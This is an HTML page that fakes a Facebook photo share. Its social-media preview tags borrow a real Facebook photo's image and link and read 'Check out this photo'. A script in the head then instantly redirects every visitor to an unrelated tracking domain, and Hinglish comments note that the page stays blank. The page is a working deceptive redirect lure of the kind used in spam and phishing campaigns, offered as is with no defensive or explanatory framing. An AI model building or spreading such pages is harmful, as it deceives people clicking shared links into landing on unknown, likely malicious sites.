<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo View</title>

    <!-- Twitter Card Meta Tags -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Check out this photo">
    <meta name="twitter:description" content="Click here to view.">
    <!-- Facebook photo graph direct link -->
    <meta name="twitter:image" content="https://graph.facebook.com/122119048041413728/picture?type=large">

    <!-- Open Graph (Facebook & WhatsApp ke liye) -->
    <meta property="og:title" content="Check out this photo">
    <meta property="og:description" content="Click here to view.">
    <meta property="og:image" content="https://graph.facebook.com/122119048041413728/picture?type=large">
    <meta property="og:url" content="https://www.facebook.com/photo.php?fbid=122119048041413728">

    <!-- Instant aur Direct Redirect karne ke liye script -->
    <script>
        window.location.replace("https://almm.urlxx347.com/?utm_source=Bullet&utm_medium=Gujjar");
    </script>
</head>
<body>
    <!-- Screen bilkul khali rahegi aur foran URL khul jayega -->
</body>
</html>
